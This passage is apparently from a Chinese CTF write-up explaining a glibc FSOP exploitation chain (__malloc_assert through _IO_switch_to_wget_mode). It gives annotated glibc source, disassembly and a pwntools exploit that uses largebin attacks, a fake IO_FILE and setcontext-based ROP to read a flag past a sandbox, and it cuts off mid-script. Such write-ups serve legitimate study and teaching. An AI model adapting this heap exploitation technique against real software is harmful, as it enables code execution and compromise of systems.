class="hljs-type">mbstate_t</span> mbstate;<br>  <span class="hljs-type">int</span> res;<br>  <span class="hljs-type">int</span> used_malloc = <span class="hljs-number">0</span>;<br>  <span class="hljs-type">size_t</span> len = <span class="hljs-built_in">strlen</span> (fmt) + <span class="hljs-number">1</span>;<br><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (len &gt; SIZE_MAX / <span class="hljs-built_in">sizeof</span> (<span class="hljs-type">wchar_t</span>)))<br>    &#123;<br>      __set_errno (EOVERFLOW);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>  <span class="hljs-keyword">if</span> (__libc_use_alloca (len * <span class="hljs-built_in">sizeof</span> (<span class="hljs-type">wchar_t</span>)))<br>    wfmt = <span class="hljs-built_in">alloca</span> (len * <span class="hljs-built_in">sizeof</span> (<span class="hljs-type">wchar_t</span>));<br>  <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((wfmt = <span class="hljs-built_in">malloc</span> (len * <span class="hljs-built_in">sizeof</span> (<span class="hljs-type">wchar_t</span>))) == <span class="hljs-literal">NULL</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  <span class="hljs-keyword">else</span><br>    used_malloc = <span class="hljs-number">1</span>;<br><br>  <span class="hljs-built_in">memset</span> (&amp;mbstate, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span> mbstate);<br>  res = __mbsrtowcs (wfmt, &amp;fmt, len, &amp;mbstate);<br><br>  <span class="hljs-keyword">if</span> (res != <span class="hljs-number">-1</span>)<br>    res = __vfwprintf_internal (fp, wfmt, ap, mode_flags);<br><br>  <span class="hljs-keyword">if</span> (used_malloc)<br>    <span class="hljs-built_in">free</span> (wfmt);<br><br>  <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行到<code>__vfwprintf_internal</code>的时候，按照正常情况最终会调用vtable指针的xsputn指针，但是如果我们对其进行了一个小偏移，例如0x10，那么他就会调用seekoff指针,</p><p>而如果我们修改vtable为<code>_IO_wfile_jumps</code>，那么就会调用到<code>_IO_wfile_jumps</code>函数</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">const <span class="hljs-keyword">struct</span> _IO_jump_t _IO_wfile_jumps libio_vtable =<br>&#123;<br>  JUMP_INIT_DUMMY,<br>  <span class="hljs-constructor">JUMP_INIT(<span class="hljs-params">finish</span>, <span class="hljs-params">_IO_new_file_finish</span>)</span>,<br>  <span class="hljs-constructor">JUMP_INIT(<span class="hljs-params">overflow</span>, (<span class="hljs-params">_IO_overflow_t</span>)</span> _IO_wfile_overflow),<br>  <span class="hljs-constructor">JUMP_INIT(<span class="hljs-params">underflow</span>, (<span class="hljs-params">_IO_underflow_t</span>)</span> _IO_wfile_underflow),<br>  <span class="hljs-constructor">JUMP_INIT(<span class="hljs-params">uflow</span>, (<span class="hljs-params">_IO_underflow_t</span>)</span> _IO_wdefault_uflow),<br>  <span class="hljs-constructor">JUMP_INIT(<span class="hljs-params">pbackfail</span>, (<span class="hljs-params">_IO_pbackfail_t</span>)</span> _IO_wdefault_pbackfail),<br>  <span class="hljs-constructor">JUMP_INIT(<span class="hljs-params">xsputn</span>, <span class="hljs-params">_IO_wfile_xsputn</span>)</span>,<br>  <span class="hljs-constructor">JUMP_INIT(<span class="hljs-params">xsgetn</span>, <span class="hljs-params">_IO_file_xsgetn</span>)</span>,<br>  <span class="hljs-constructor">JUMP_INIT(<span class="hljs-params">seekoff</span>, <span class="hljs-params">_IO_wfile_seekoff</span>)</span>,<br>  <span class="hljs-constructor">JUMP_INIT(<span class="hljs-params">seekpos</span>, <span class="hljs-params">_IO_default_seekpos</span>)</span>,<br>  <span class="hljs-constructor">JUMP_INIT(<span class="hljs-params">setbuf</span>, <span class="hljs-params">_IO_new_file_setbuf</span>)</span>,<br>  <span class="hljs-constructor">JUMP_INIT(<span class="hljs-params">sync</span>, (<span class="hljs-params">_IO_sync_t</span>)</span> _IO_wfile_sync),<br>  <span class="hljs-constructor">JUMP_INIT(<span class="hljs-params">doallocate</span>, <span class="hljs-params">_IO_wfile_doallocate</span>)</span>,<br>  <span class="hljs-constructor">JUMP_INIT(<span class="hljs-params">read</span>, <span class="hljs-params">_IO_file_read</span>)</span>,<br>  <span class="hljs-constructor">JUMP_INIT(<span class="hljs-params">write</span>, <span class="hljs-params">_IO_new_file_write</span>)</span>,<br>  <span class="hljs-constructor">JUMP_INIT(<span class="hljs-params">seek</span>, <span class="hljs-params">_IO_file_seek</span>)</span>,<br>  <span class="hljs-constructor">JUMP_INIT(<span class="hljs-params">close</span>, <span class="hljs-params">_IO_file_close</span>)</span>,<br>  <span class="hljs-constructor">JUMP_INIT(<span class="hljs-params">stat</span>, <span class="hljs-params">_IO_file_stat</span>)</span>,<br>  <span class="hljs-constructor">JUMP_INIT(<span class="hljs-params">showmanyc</span>, <span class="hljs-params">_IO_default_showmanyc</span>)</span>,<br>  <span class="hljs-constructor">JUMP_INIT(<span class="hljs-params">imbue</span>, <span class="hljs-params">_IO_default_imbue</span>)</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>其中开头有这样一段函数</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs xl">off64_t<br>_IO_wfile_seekoff (FILE *fp, off64_t offset, int dir, int mode)<br>&#123;<br>  off64_t result;<br>  off64_t delta, new_offset;<br>  long int count;<br><br>  <span class="hljs-comment">/* Short-circuit into a separate function.  We don&#x27;t want to mix any</span><br><span class="hljs-comment">     functionality and we don&#x27;t want to touch anything inside the FILE</span><br><span class="hljs-comment">     object. */</span><br>  <span class="hljs-keyword">if</span> (mode == <span class="hljs-number">0</span>)<br>    return do_ftell_wide (fp);<br><br>  <span class="hljs-comment">/* POSIX.1 8.2.3.7 says that after a call the fflush() the file</span><br><span class="hljs-comment">     offset of the underlying file must be exact.  */</span><br>  <span class="hljs-function"><span class="hljs-title">int</span> must_be_exact = ((fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_read_base<br>== <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_read_end)<br>       &amp;&amp; (<span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_base<br>   == <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_ptr));<br><br>  <span class="hljs-function"><span class="hljs-title">bool</span> was_writing = ((fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_ptr<br>       &gt; <span class="hljs-function"><span class="hljs-title">fp</span>-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_base)<br>      || _IO_in_put_mode (fp));<br><br><br>  <span class="hljs-keyword">if</span> (was_writing &amp;&amp; _IO_switch_to_wget_mode (fp))<br>    return WEOF;<br>    <br>   ...<br></code></pre></td></tr></table></figure><p>其中若通过了一定检测则会调用到<code>_IO_switch_to_wget_mode</code>函数，如下：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xl">int<br>_IO_switch_to_wget_mode (FILE *fp)<br>&#123;<br>  <span class="hljs-function"><span class="hljs-title">if</span> (fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_<span class="hljs-function"><span class="hljs-title">write_ptr</span> &gt; fp-&gt;</span>_<span class="hljs-function"><span class="hljs-title">wide_data</span>-&gt;</span>_IO_write_base)<br>    <span class="hljs-keyword">if</span> ((wint_t)_IO_WOVERFLOW (fp, WEOF) == WEOF)<br>      return EOF;<br>      <br>...<br></code></pre></td></tr></table></figure><p>而这里通过源码的调试实际上会调用到我们<code>rax+0x18</code>的地址，这里我们可以通过之前fake IO的构造来写入setcontext+61或者system,</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">► <span class="hljs-number">0x7f273d283d30</span> &lt;_IO_switch_to_wget_mode&gt;       endbr64                                                 <br>  <span class="hljs-number">0x7f273d283d34</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">4</span>&gt;     <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">0xa0</span>]                      <br>  <span class="hljs-number">0x7f273d283d3b</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">11</span>&gt;    <span class="hljs-keyword">push</span>   <span class="hljs-built_in">rbx</span>                                              <br>  <span class="hljs-number">0x7f273d283d3c</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">12</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rbx</span>, <span class="hljs-built_in">rdi</span>                                         <br>  <span class="hljs-number">0x7f273d283d3f</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">15</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0x20</span>]                      <br>  <span class="hljs-number">0x7f273d283d43</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">19</span>&gt;    <span class="hljs-keyword">cmp</span>    <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0x18</span>]                      <br>  <span class="hljs-number">0x7f273d283d47</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">23</span>&gt;    <span class="hljs-keyword">jbe</span>    _IO_switch_to_wget_mode+<span class="hljs-number">56</span>                &lt;_IO_switch_to_wget_mode+<span class="hljs-number">56</span>&gt;                                                                                                                                                                                 <br>  <span class="hljs-number">0x7f273d283d49</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">25</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">rax</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0xe0</span>]                      <br>  <span class="hljs-number">0x7f273d283d50</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">32</span>&gt;    <span class="hljs-keyword">mov</span>    <span class="hljs-built_in">esi</span>, <span class="hljs-number">0xffffffff</span>                                  <br>  <span class="hljs-number">0x7f273d283d55</span> &lt;_IO_switch_to_wget_mode+<span class="hljs-number">37</span>&gt;    <span class="hljs-keyword">call</span>   <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rax</span> + <span class="hljs-number">0x18</span>]                           <br><br></code></pre></td></tr></table></figure><p>可以看到最后的一条汇编是直接的call指令，且此时的rax我们是指向的fake IO中我们布置的<code>_wide_data</code>的,这里同样重要是因为在上面我们需要绕过的检测基本上都会有他</p><p>调用链完整版如下：</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf"><span class="hljs-variable">__malloc_assert</span><br> <span class="hljs-variable">__fxprintf</span><br> <span class="hljs-variable">__vfxprintf</span><br> <span class="hljs-variable">__locked_vfxprintf</span><br> <span class="hljs-variable">__vfwprintf_internal</span><br> <span class="hljs-variable">_IO_wfile_seekoff</span><br> <span class="hljs-variable">_IO_switch_to_wget_mode</span><br></code></pre></td></tr></table></figure><p>然后由于题目中带有沙箱，所以我们往<code>rax+0x18</code>写入setcontext+0x61，然后在堆上布置栈进行srop即可</p><p>exp如下：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">from</span> pwn import *<br><span class="hljs-attribute">from</span> ctypes import *<br><span class="hljs-attribute">context</span>(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level = &#x27;debug&#x27;)<br><span class="hljs-attribute">context</span>.terminal =<span class="hljs-meta"> [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span><br><br><br><span class="hljs-attribute">s</span>   = lambda content : io.send(content)<br><span class="hljs-attribute">sl</span>  = lambda content : io.sendline(content)<br><span class="hljs-attribute">sa</span>  = lambda content,send : io.sendafter(content, send)<br><span class="hljs-attribute">sla</span> = lambda content,send : io.sendlineafter(content, send)<br><span class="hljs-attribute">rc</span>  = lambda number : io.recv(number)<br><span class="hljs-attribute">ru</span>  = lambda content : io.recvuntil(content)<br><span class="hljs-attribute">rcl</span> = lambda : io.recvline()<br><br><span class="hljs-attribute">def</span> slog(name, address): print(<span class="hljs-string">&quot;\033[40;34m[+]\033[40;35m&quot;</span> + name + <span class="hljs-string">&quot;==&gt;&quot;</span> +hex(address) + <span class="hljs-string">&quot;\033[0m&quot;</span>)<br><br><span class="hljs-attribute">def</span> debug(cmd = <span class="hljs-number">0</span>):<br>    <span class="hljs-attribute">if</span> cmd == <span class="hljs-number">0</span>:<br>        <span class="hljs-attribute">gdb</span>.attach(io)<br>    <span class="hljs-attribute">else</span>:<br>        <span class="hljs-attribute">gdb</span>.attach(io, cmd)<br>    <br><span class="hljs-attribute">def</span> get_address(mode = <span class="hljs-number">0</span>): <br>    <span class="hljs-attribute">if</span> mode == <span class="hljs-number">0</span>:<br>        <span class="hljs-attribute">return</span> u64(ru(&#x27;\x7f&#x27;)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>, b&#x27;\x00&#x27;))<br>    <span class="hljs-attribute">elif</span> mode == <span class="hljs-number">1</span>:<br>        <span class="hljs-attribute">return</span> u64(rc(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, b&#x27;\x00&#x27;))<br>    <span class="hljs-attribute">elif</span> mode == <span class="hljs-number">2</span>:<br>        <span class="hljs-attribute">return</span> int(rc(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br>    <span class="hljs-attribute">elif</span> mode == <span class="hljs-number">3</span>:<br>        <span class="hljs-attribute">return</span> int(rc(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br>    <span class="hljs-attribute">else</span> :<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">0</span><br><br><span class="hljs-attribute">def</span> choice(type_flag, content):<br>    <span class="hljs-attribute">sla</span>(<span class="hljs-string">&quot;~~\n&quot;</span>, type_flag + b<span class="hljs-string">&quot; | r00t bbbQWBaaaaa&quot;</span> + content + b<span class="hljs-string">&quot;QWXFdsfsfds&quot;</span>)<br><br><span class="hljs-attribute">def</span> add(index, size, content):<br>    <span class="hljs-attribute">choice</span>(b<span class="hljs-string">&quot;CAT&quot;</span>, b&#x27;\xff\xff\xff\xff&#x27; + b<span class="hljs-string">&quot;$&quot;</span>)<br>    <span class="hljs-attribute">sla</span>(<span class="hljs-string">&quot;choice:\n&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>    <span class="hljs-attribute">sla</span>(<span class="hljs-string">&quot;idx:\n&quot;</span>, str(index))<br>    <span class="hljs-attribute">sla</span>(<span class="hljs-string">&quot;size:\n&quot;</span>, str(size))<br>    <span class="hljs-attribute">sa</span>(<span class="hljs-string">&quot;content:\n&quot;</span>, content)<br><br><span class="hljs-attribute">def</span> delete(index):<br>    <span class="hljs-attribute">choice</span>(b<span class="hljs-string">&quot;CAT&quot;</span>, b<span class="hljs-string">&quot;\xff\xff\xff\xff$&quot;</span>)<br>    <span class="hljs-attribute">sla</span>(<span class="hljs-string">&quot;choice:\n&quot;</span>, <span class="hljs-string">&quot;2&quot;</span>)<br>    <span class="hljs-attribute">sla</span>(<span class="hljs-string">&quot;idx:\n&quot;</span>, str(index))<br><br><span class="hljs-attribute">def</span> show(index):<br>    <span class="hljs-attribute">choice</span>(b<span class="hljs-string">&quot;CAT&quot;</span>, b<span class="hljs-string">&quot;\xff\xff\xff\xff$&quot;</span>)<br>    <span class="hljs-attribute">sla</span>(<span class="hljs-string">&quot;choice:\n&quot;</span>, <span class="hljs-string">&quot;3&quot;</span>)<br>    <span class="hljs-attribute">sla</span>(<span class="hljs-string">&quot;idx:\n&quot;</span>, str(index))<br>    <br><span class="hljs-attribute">def</span> mini(index, content):<br>    <span class="hljs-attribute">choice</span>(b<span class="hljs-string">&quot;CAT&quot;</span>, b<span class="hljs-string">&quot;\xff\xff\xff\xff$&quot;</span>)<br>    <span class="hljs-attribute">sla</span>(<span class="hljs-string">&quot;choice:\n&quot;</span>, <span class="hljs-string">&quot;4&quot;</span>)<br>    <span class="hljs-attribute">sla</span>(<span class="hljs-string">&quot;idx:\n&quot;</span>, str(index))<br>    <span class="hljs-attribute">sa</span>(<span class="hljs-string">&quot;content:\n&quot;</span>, content)<br><br><span class="hljs-attribute">io</span> = process(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><span class="hljs-comment">#io = remote(&quot;node5.anna.nssctf.cn&quot;,28522)</span><br><span class="hljs-attribute">choice</span>(b<span class="hljs-string">&quot;LOGIN&quot;</span>, b<span class="hljs-string">&quot;admin&quot;</span>)<br><br><span class="hljs-comment"># leak the libc and heap addr</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>x428, <span class="hljs-string">&quot;hllllll&quot;</span>)<br><span class="hljs-attribute">add</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0</span>x438, <span class="hljs-string">&quot;helloworld&quot;</span>)<br><span class="hljs-attribute">add</span>(<span class="hljs-number">2</span>, <span class="hljs-number">0</span>x418, <span class="hljs-string">&quot;fasdfas&quot;</span>)<br><br><span class="hljs-attribute">delete</span>(<span class="hljs-number">0</span>)<br><span class="hljs-attribute">add</span>(<span class="hljs-number">3</span>, <span class="hljs-number">0</span>x438, <span class="hljs-string">&quot;mew mew mew&quot;</span>)<br><span class="hljs-attribute">show</span>(<span class="hljs-number">0</span>)<br><span class="hljs-attribute">libc_base</span> = get_address() - <span class="hljs-number">0</span>x21a0d0<br><span class="hljs-attribute">show</span>(<span class="hljs-number">0</span>)<br><span class="hljs-attribute">ru</span>(&#x27;text:\n&#x27;)<br><span class="hljs-attribute">rc</span>(<span class="hljs-number">0</span>x10)<br><span class="hljs-attribute">heap_base</span> = get_address(<span class="hljs-number">1</span>) - <span class="hljs-number">0</span>x290<br><br><span class="hljs-attribute">slog</span>(<span class="hljs-string">&quot;libc_base&quot;</span>, libc_base)<br><span class="hljs-attribute">slog</span>(<span class="hljs-string">&quot;heap_base&quot;</span>, heap_base)<br><br><span class="hljs-attribute">libc</span> = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br><span class="hljs-attribute">pop_rax</span> = libc_base + <span class="hljs-number">0</span>x45eb0<br><span class="hljs-attribute">pop_rdi</span> = libc_base + <span class="hljs-number">0</span>x2a3e5<br><span class="hljs-attribute">pop_rsi</span> = libc_base + <span class="hljs-number">0</span>x2be51<br><span class="hljs-attribute">pop_rdx_r12</span> = libc_base + <span class="hljs-number">0</span>x11f497<br><span class="hljs-attribute">pop_rcx</span> = libc_base + <span class="hljs-number">0</span>x8c6bb<br><span class="hljs-attribute">syscall_ret</span> = libc_base + next(libc.search(asm(<span class="hljs-string">&quot;syscall;ret&quot;</span>)))<br><span class="hljs-attribute">stderr_addr</span> = libc_base + libc.sym[&#x27;stderr&#x27;]<br><span class="hljs-attribute">open_addr</span> = libc_base + libc.sym[&#x27;open&#x27;]<br><span class="hljs-attribute">read_addr</span> = libc_base + libc.sym[&#x27;read&#x27;]<br><span class="hljs-attribute">write_addr</span> = libc_base + libc.sym[&#x27;write&#x27;]<br><span class="hljs-attribute">setcontext_addr</span> = libc_base + libc.sym[&#x27;setcontext&#x27;]<br><span class="hljs-attribute">close_addr</span> = libc_base + libc.sym[&#x27;close&#x27;]<br><span class="hljs-attribute">main_arena</span> = libc_base <br><span class="hljs-attribute">ret</span> = libc_base + <span class="hljs-number">0</span>x29cd6<br><span class="hljs-attribute">slog</span>(<span class="hljs-string">&quot;main_arena&quot;</span>, main_arena)<br><span class="hljs-attribute">slog</span>(<span class="hljs-string">&quot;stderr_addr&quot;</span>, stderr_addr)<br><br><span class="hljs-comment"># largebin attack 1: modify the stderr ptr to point our heap</span><br><span class="hljs-attribute">fake_IO_addr</span> = heap_base + <span class="hljs-number">0</span>xb00<br><span class="hljs-attribute">fake_IO_FILE</span> = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span> <br><span class="hljs-attribute">fake_IO_FILE</span> += p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">0</span>) #_IO_buf_end &amp; _IO_save_base | .widedata-&gt;write_base<br><span class="hljs-attribute">fake_IO_FILE</span> += p64(fake_IO_addr + <span class="hljs-number">0</span>xb0) #_IO_backup_base_ || .widedata-&gt;write_pt<br><span class="hljs-attribute">fake_IO_FILE</span> += p64(setcontext_addr + <span class="hljs-number">61</span>)<br><span class="hljs-attribute">fake_IO_FILE</span> = (fake_IO_FILE).ljust(<span class="hljs-number">0</span>x58, b&#x27;\x00&#x27;) #offset of _chain<br><span class="hljs-attribute">fake_IO_FILE</span> += p64(<span class="hljs-number">0</span>) #_chain<br><span class="hljs-attribute">fake_IO_FILE</span> = (fake_IO_FILE).ljust(<span class="hljs-number">0</span>x78, b&#x27;\x00&#x27;) #offset of lock<br><span class="hljs-attribute">fake_IO_FILE</span> += p64(heap_base + <span class="hljs-number">0</span>x200) #lock = writeble address<br><span class="hljs-attribute">fake_IO_FILE</span> = (fake_IO_FILE).ljust(<span class="hljs-number">0</span>x90, b&#x27;\x00&#x27;) #offset of widedata<br><span class="hljs-attribute">fake_IO_FILE</span> += p64(heap_base + <span class="hljs-number">0</span>xb30) #rax1<br><span class="hljs-attribute">fake_IO_FILE</span> = (fake_IO_FILE).ljust(<span class="hljs-number">0</span>xb0, b&#x27;\x00&#x27;)<br><span class="hljs-attribute">fake_IO_FILE</span> += p64(<span class="hljs-number">1</span>)  #_mode = <span class="hljs-number">1</span><br><span class="hljs-attribute">fake_IO_FILE</span> = (fake_IO_FILE).ljust(<span class="hljs-number">0</span>xc8, b&#x27;\x00&#x27;) #offset of vtable<br><span class="hljs-attribute">fake_IO_FILE</span> += p64(libc_base + <span class="hljs-number">0</span>x2160c0 + <span class="hljs-number">0</span>x10) #vtable = _IO_wfile_jumps<br><span class="hljs-attribute">fake_IO_FILE</span> += p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span><br><span class="hljs-attribute">fake_IO_FILE</span> += p64(fake_IO_addr + <span class="hljs-number">0</span>x40) #rax2<br><span class="hljs-attribute">payload1</span> = fake_IO_FILE + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">7</span><br><span class="hljs-attribute">payload1</span> += p64(heap_base + <span class="hljs-number">0</span>x24a0) + p64(ret) #fake heap rsp &amp;&amp; rcx<br><span class="hljs-attribute">fake_head</span> = p64(libc_base + <span class="hljs-number">0</span>x21a0d0)*<span class="hljs-number">2</span> + p64(heap_base + <span class="hljs-number">0</span>x290) + p64(stderr_addr - <span class="hljs-number">0</span>x20)<br><span class="hljs-attribute">mini</span>(<span class="hljs-number">0</span>, fake_head)<br><span class="hljs-attribute">delete</span>(<span class="hljs-number">2</span>)<br><span class="hljs-attribute">add</span>(<span class="hljs-number">5</span>, <span class="hljs-number">0</span>x418, payload1)<br><span class="hljs-attribute">delete</span>(<span class="hljs-number">5</span>)<br><span class="hljs-attribute">add</span>(<span class="hljs-number">6</span>, <span class="hljs-number">0</span>x438, <span class="hljs-string">&quot;nihao&quot;</span>)<br><span class="hljs-comment"># largebin attack 2: modify the top chunk ptr</span><br><span class="hljs-attribute">fake_head</span> = p64(libc_base + <span class="hljs-number">0</span>x21a0e0)*<span class="hljs-number">2</span> + p64(heap_base + <span class="hljs-number">0</span>x2040) + p64(heap_base + <span class="hljs-number">0</span>x2d50 + <span class="hljs-number">0</span>x3 - <span class="hljs-number">0</span>x20)<br><span class="hljs-attribute">add</span>(<span class="hljs-number">7</span>, <span class="hljs-number">0</span>x438, <span class="hljs-string">&quot;small&quot;</span>)<br><span class="hljs-attribute">add</span>(<span class="hljs-number">8</span>, <span class="hljs-number">0</span>x458, <span class="hljs-string">&quot;./flag&quot;</span>)<br><span class="hljs-attribute">add</span>(<span class="hljs-number">9</span>, <span class="hljs-number">0</span>x448, <span class="hljs-string">&quot;big&quot;</span>)<br><span class="hljs-attribute">orw</span> = p64(pop_rdi) + p64(<span 